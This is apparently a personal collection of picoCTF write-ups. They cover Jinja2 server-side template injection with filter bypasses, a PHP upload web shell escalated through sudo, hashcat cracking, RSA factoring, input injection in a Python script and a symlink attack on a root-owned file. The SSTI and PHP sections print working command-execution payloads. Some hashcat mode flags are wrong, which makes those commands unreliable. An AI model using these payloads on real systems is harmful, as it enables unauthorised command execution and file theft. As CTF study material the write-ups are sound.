# My picoCTF exercises

## [My picoCTF profile](https://play.picoctf.org/users/RedZunder)
- [Web exploitation](#web-exploitation)
- [Cryptography](#cryptography)
- [Reverse engineering](#reverse-engineering)
- [General Skills](#general-skills)


# Web Exploitation
<details open>
  <summary>SSTI1</summary>
  
  Entering the target website, we find an input field which 'announces' the user input. As inferred from the title of this CTF, we are looking to Server Side Template Injection.
  Using this workflow from [Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti):
  ![image](https://github.com/user-attachments/assets/64991461-7402-4241-959a-9405862694a3)

  `$(7*7)` simply returns that literal string. Writing `{{7*7}}`, however, returns `49`. Sending `{{7*'7'}}` gives back `7777777`, suggesting the server might be running **Jinja2**.
  Now we can run commands like this one: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` to see the files in the directory. Doing this we find a `flag` file.
  Naturally, we try to read this file: `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` which returns the flag successfully.  
</details>

<details open>
<summary>SSTI2</summary>
  
Extending the previous exercise, now the machine has sanatized some input, although not all of it. Trying `{{request.application}}` does not work, and we are told to "stop trying to break me". So let's try to break it. 

We'll use `{{request|attr('application')}}`, which succesfully gives us an answer: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`.
Trying with `{{request|attr('application')|attr("__globals__")}}` doesn't work, so we'll replace the underscore by its hex value `\x5f`: `{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")}}` which gives the right information. 

Substituting '__import__' by `\x5f\x5fgetitem\x5f\x5f` we can obtain the rest of attributes. Then, replicating the `ls` command in the previous exercise:

```
{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr('popen')('ls')|attr('read')()}}
```
Which shows a file `flag`. We can obtain its contents with `cat flag`:
```
{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr('popen')('cat flag')|attr('read')()}}
```
</details>







<details open>
<summary>n0s4n1ty 1</summary>

When entering the machine, we are presented a page where the user can upload a profile picture. First we will try to exploit this by checking if the input is sanitized. Trying to upload some `test.txt` file, and navigating to `/uploads/test.txt` as indicated by the upload page, we see the input is indeed not sanitized, since we are able to upload _any_ type of file. Next, we start trying differet commands in a `php` file:
```php
<?php

echo getcwd();

?>
```
which successfully returns the path `/var/www/html/uploads` . Knowing the structure, we try `ls /` and see where the `root` folder is. Now we can test if we may be able to `sudo` commands. Adding `sudo -l` we obtain:
```
...
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```
Meaningg we can `sudo` whatever we want. So, we attempt `echo shell_exec('sudo ls /root')` and find `flag.txt` in that folder. 

Finally, adding the line `echo shell_exec('sudo cat /root/flag.txt')` gives us the flag.
</details>















# Cryptography

<details open>
<summary>Hashcrack</summary>
  
When we use _netcat_ to get the server, we are given a hash. Checking its length, we see it's 32 characters, or 128 bits, typical of MD5. 

Using ```hashcat -m 0 -a 0 <hash> /usr/share/wordlists/rockyou.txt``` we crack the password pretty quick.
The next hash is 40 char long, or 160 bits. Trying first with SHA-1, ```hashcat -m 0 -a 100 <hash> /usr/share/wordlists/rockyou.txt``` we again obtain the password. 

One last time, the hash is of length 64, or 256 bits. Supposing it's SHA-256 and running the same command with ```-a 1400```, we obtain the flag.

</details>

<details open>
<summary>Even RSA can be broken</summary>
  
First we use _netcat_ to get the encrypted flag, 'N' and 'e'. Looking at the source code provided, we see how the RSA keys are calculated.
```python
def gen_key(k):
    """
    Generates RSA key with k bits
    """
    p,q = get_primes(k//2)
    N = p*q
    d = inverse(e, (p-1)*(q-1))

    return ((N,e), d)
```
From the library `Crypto.Util.number` we can make use of `inverse` to reverse this encryption.
```python
#We obtain the prime factors of N
(p,q)=factorint(N)

#We calculate phi, needed for the next step
phi=(p-1)*(q-1)

#We get the inverse modulo, from the algorithm:  (d*e) % phi = 1
d=inverse(e,phi)

#Finally obtain the flag -> From the source code:  pow(bytes_to_long(flag.encode(utf-8)),e,N) so we reverse it
flag=long_to_bytes(pow(cypher,d,N)).decode()
```
  
</details>





# Reverse Engineering
<details open>
<summary>Flag Hunters</summary>
  
We use _netcat_ to communicate with the server and download the Python source code. Checking the code, we observe:

```python
elif re.match(r"CROWD.*", line):
    crowd = input('Crowd: ')
    song_lines[lip] = 'Crowd: ' + crowd
```
Which allows the user to enter anything, including commands.
We can also find:

```python
elif re.match(r"RETURN [0-9]+", line):
    lip = int(line.split()[1])
```
Which returns to the beginning of one of the paragraphs from 0 to 9. The flag is stored in paragraph 0, which is not shown.
We can then inject the code ```blablabla; RETURN 0``` in order to trigger the RETURN case, and thus obtain the flag in plaintext.


</details>



# General Skills

<details open>
<summary>Plumbing</summary>
  
This challenge is trivial: simply `nc` to the machine and obtain a large text, then I used `| grep 'pico'` and obtained the flag.

<details open>
<summary>Based</summary>

Also a trivial challenge, we must translate from binary, octal and hex to ascii within 45 seconds. I simply used online tools to translate the inputs, and obtain the flag.

</details>

<details open>
  <summary>dont-you-love-banners</summary>
  
  For this task we use `netcat` first to a 'leaking' server, which gives us a password in plain text.
  Next, we `nc` to the target machine, which prompts us for the password, which we obtained from the other machine. After answering some questions, we find ourselves in the shell:

![image](https://github.com/user-attachments/assets/c93fe9bc-4517-4866-983d-dc2146794efc)

Poking around we find the root folder which contains the flag:
```shell
$ls /root
> flag.txt  script.py
```
However we don't have permissions to open the flag. Doing `cat script.py` we find the reference to another file:
```python
with open("/home/player/banner", "r") as f:
        print(f.read())
```
So we only need to replace the `banner` file for `flag.txt`. For that we use a _symlink_. Travelling to the `player` folder which contains the banner:  `rm banner; ln -s /root/flag.txt banner`
This swaps the banner for a file pointing to our flag. Now we can use `netcat` again to contact the server, and we get the flag in plaintext.

</details>
















